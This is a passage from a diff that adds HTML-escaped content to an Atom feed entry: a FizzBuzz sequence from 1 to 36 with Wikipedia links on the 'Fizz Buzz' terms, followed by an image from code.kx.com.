+1, 2, Fizz, 4, Buzz, Fizz, 7, 8, Fizz, Buzz, 11, Fizz, 13, 14, &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Fizz_buzz&quot;&gt;Fizz Buzz&lt;&#x2F;a&gt;, 16, 17, Fizz, 19, Buzz, Fizz, 22, 23, Fizz, Buzz, 26, Fizz, 28, 29, &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Fizz_buzz&quot;&gt;Fizz Buzz&lt;&#x2F;a&gt;, 31, 32, Fizz, 34, Buzz, Fizz&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;image&quot;&gt;Image&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;code.kx.com&#x2F;q&#x2F;img&#x2F;fizzbuzz.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
